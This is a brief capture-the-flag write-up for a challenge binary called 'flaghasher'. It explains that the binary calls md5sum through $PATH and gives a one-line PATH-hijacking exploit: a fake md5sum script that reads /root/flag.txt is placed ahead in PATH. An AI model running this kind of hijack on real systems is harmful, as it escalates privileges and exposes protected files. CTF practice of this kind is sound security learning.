# Why is this in binexp in the first place??

The binary flaghasher calls md5sum but doesnt give it the aboslute path instead relying on the $PATH to do it. You can solve it in one line like:

>>mkdir -p /tmp/fb && printf '%s\n' '#!/bin/sh' 'cat /root/flag.txt' > /tmp/fb/md5sum && chmod +x /tmp/fb/md5sum && PATH=/tmp/fb:$PATH ./flaghasher

Basically it creates another md5sum program that only reads the flag and adds it to $PATH so that it tricks the binary.
